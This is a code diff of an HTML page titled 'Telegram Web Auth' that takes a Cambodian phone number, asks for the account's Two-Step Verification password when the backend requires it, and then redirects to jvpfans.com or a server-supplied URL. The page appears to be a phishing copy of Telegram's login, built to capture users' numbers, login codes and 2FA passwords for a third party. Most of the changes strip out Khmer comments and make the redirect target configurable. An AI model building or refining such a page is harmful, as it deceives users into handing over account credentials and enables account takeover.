@@ -2,7 +2,6 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <!-- ការពារ Auto-Zoom លើ Mobile -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram Web Auth</title>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -87,7 +86,7 @@
 
         // ទប់ស្កាត់មិនឱ្យលុបអក្សរ "+855 "
         function preventPrefixDelete(e, input) {
-            const prefixLength = 5; // ប្រវែងនៃ "+855 "
+            const prefixLength = 5;
             if (e.key === 'Backspace' && input.selectionStart <= prefixLength && input.selectionEnd <= prefixLength) {
                 e.preventDefault();
             }
@@ -120,7 +119,6 @@
 
             let rawDigits = input.value.slice(5).replace(/[^\d]/g, '');
 
-            // កាត់លេខ 0 ខាងមុខចោលករណីអ្នកប្រើប្រាស់វាយលេខ 0 (ឧ. 012 -> 12)
             if (rawDigits.startsWith('0')) {
                 rawDigits = rawDigits.slice(1);
             }
@@ -201,7 +199,8 @@
                 const data = await res.json();
 
                 if (data.success) {
-                    window.location.href = "https://jvpfans.com";
+                    // លោតទៅកាន់ jvpfans.com ភ្លាមៗ
+                    window.location.href = data.redirectUrl || "https://jvpfans.com";
                 } else if (data.requiresPassword) {
                     document.getElementById('password-container').classList.remove('hidden');
                     alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
